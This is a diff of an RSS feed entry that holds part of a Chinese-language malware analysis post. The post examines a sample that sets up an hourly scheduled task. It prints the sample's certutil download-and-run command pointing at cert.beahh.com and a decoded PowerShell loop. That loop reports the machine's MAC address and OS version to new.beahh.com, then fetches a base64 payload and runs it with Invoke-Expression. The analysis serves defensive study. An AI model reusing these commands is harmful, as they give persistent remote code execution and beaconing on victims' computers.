@@ -7,46 +7,33 @@
 &lt;h2 id="0x02-分析过程">0x02 分析过程&lt;/h2>
 &lt;h3 id="解密第一层">解密第一层&lt;/h3>
 &lt;p>病毒样本：&lt;/p>
-&lt;p>
- &lt;img src="https://images.payloads.online/4d16b518-4f5f-11ec-b05e-00d861bf4abb.png" alt="">
-
-&lt;/p>
+&lt;p>&lt;img src="https://images.payloads.online/4d16b518-4f5f-11ec-b05e-00d861bf4abb.png" alt="">&lt;/p>
 &lt;p>第一个动作，创建一个名为&lt;code>Certificate&lt;/code>的任务计划，在七点开始，每隔一小时执行一次以下命令：&lt;/p>
-&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
-&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-fallback" data-lang="fallback">&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cmd.exe /c (cd %temp%&amp;amp;certutil -urlcache -split -f http://cert.beahh.com/cert.php?ver1=%COMPUTERNAME% v.dat&amp;gt;nul&amp;amp;expand -r v.dat&amp;gt;nul&amp;amp;v.bat&amp;gt;nul&amp;amp;del v.dat v.bat&amp;gt;nul)
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;p>由于目前&lt;code>cert.beahh.com&lt;/code>已经无法访问，所以进行下一个powershell分析环节。&lt;/p>
+&lt;pre tabindex="0">&lt;code>
+cmd.exe /c (cd %temp%&amp;amp;certutil -urlcache -split -f http://cert.beahh.com/cert.php?ver1=%COMPUTERNAME% v.dat&amp;gt;nul&amp;amp;expand -r v.dat&amp;gt;nul&amp;amp;v.bat&amp;gt;nul&amp;amp;del v.dat v.bat&amp;gt;nul)
+&lt;/code>&lt;/pre>&lt;p>由于目前&lt;code>cert.beahh.com&lt;/code>已经无法访问，所以进行下一个powershell分析环节。&lt;/p>
 &lt;p>首先，&lt;code>powershell -nop -w hidden -ep bypass -e &lt;/code>后接着就是base64编码的powershell代码，并且以Bypass作为当前执行策略。&lt;/p>
 &lt;p>Windows中的powershell执行策略：&lt;/p>
-&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
-&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
-&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
-&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
-&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
-&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-fallback" data-lang="fallback">&lt;span style="display:flex;">&lt;span>PS C:\Users\Rvn0xsy&amp;gt; Get-ExecutionPolicy -List
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Scope ExecutionPolicy
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ----- ---------------
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>MachinePolicy Undefined
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> UserPolicy Undefined
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Process Undefined
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> CurrentUser Undefined
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> LocalMachine Bypass
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;p>将后面的base64解密后：&lt;/p></description></item></channel></rss>
+&lt;pre tabindex="0">&lt;code>PS C:\Users\Rvn0xsy&amp;gt; Get-ExecutionPolicy -List
+
+ Scope ExecutionPolicy
+ ----- ---------------
+MachinePolicy Undefined
+ UserPolicy Undefined
+ Process Undefined
+ CurrentUser Undefined
+ LocalMachine Bypass
+&lt;/code>&lt;/pre>&lt;p>将后面的base64解密后：&lt;/p>
+&lt;p>&lt;img src="https://images.payloads.online/4d5d8218-4f5f-11ec-baeb-00d861bf4abb.png" alt="">&lt;/p>
+&lt;p>得到如下代码：&lt;/p>
+&lt;pre tabindex="0">&lt;code>while($true)
+{
+[System.Threading.Thread]::Sleep(200000);
+[string]$m = (getmac /FO CSV|Select-Object -Skip 1 -first 1| ConvertFrom-Csv -Header MAC|select-object -expand MAC)
+$q = [System.Net.WebRequest]::Create(&amp;#34;http://new.beahh.com/startup.php?ver=1&amp;amp;mac=&amp;#34;+$m+&amp;#34;&amp;amp;ver=&amp;#34;+(Get-WmiObject -Class Win32_OperatingSystem).version+&amp;#34;&amp;amp;bit=&amp;#34;+(Get-WmiObject Win32_OperatingSystem).OSArchitecture).GetResponse().GetResponseStream();
+$r = (new-object System.IO.StreamReader $q).ReadToEnd() -replace &amp;#34;##&amp;#34;;
+$c = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($r));
+iex $c;
+[System.Threading.Thread]::Sleep(1000000);
+}
+&lt;/code>&lt;/pre>&lt;p>外部是一个循环，将Sleep去除后，可以看到调用了&lt;code>Invoke-Expression&lt;/code>，&lt;code>Invoke-Expression&lt;/code>是一个能将变量的内容当作powershell表达式执行的函数。&lt;/p></description></item></channel></rss>
